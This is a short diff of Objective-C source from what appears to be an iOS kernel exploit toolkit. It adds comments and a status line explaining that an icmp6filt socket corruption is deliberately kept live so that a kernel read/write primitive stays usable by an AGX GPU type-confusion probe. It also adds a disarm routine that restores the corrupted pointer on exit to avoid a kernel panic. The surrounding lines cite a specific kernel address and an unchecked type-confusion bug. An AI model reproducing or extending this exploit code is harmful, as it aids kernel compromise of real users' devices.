@@ -3706,6 +3706,14 @@ static int agx_kread(uint64_t addr, void *buf, size_t len) {
     [r appendString:@"\n=== AGX stamp-slot type confusion (18.6: no safeMetaCast) ===\n"];
     kpNote(r, @"  handleChannelErrorEvent 0xfffffff00880ae2c — no type check on getElement(stamp_idx)");
     kpNote(r, @"  detection only — no kernel writes");
+    // PEV1-CLEANUP: AGX runs in the SAME process as pe_v1 and needs its kread
+    // primitive, so the icmp6filt corruption stays live on purpose. The zalloc
+    // panic class is NOT caused by AGX — it is soclose of that corrupted socket.
+    // kexploit_disarm_for_close() (atexit + applicationWillTerminate) restores
+    // the pointer before the process dies. Do not close the KRW sockets before
+    // that runs.
+    kpNote(r, @"  pe_v1/KRW state: %@ (icmp6filt corruption stays live for kread; disarmed on exit)",
+           (darksword_control_socket_pcb() != 0) ? @"LIVE — same process as this probe" : @"not live");
 
     agx_tc_krw_t krw;
     memset(&krw, 0, sizeof(krw));
@@ -3716,6 +3724,10 @@ static int agx_kread(uint64_t addr, void *buf, size_t len) {
     if (n) [r appendFormat:@"%s", cbuf];
     else   [r appendString:@"FAIL: agx_typeconf_probe_run returned 0\n"];
     return r;
+}
+
++ (void)disarmKrwForClose {
+    kexploit_disarm_for_close();
 }
 
 // --- kcall test worker (file scope) ---
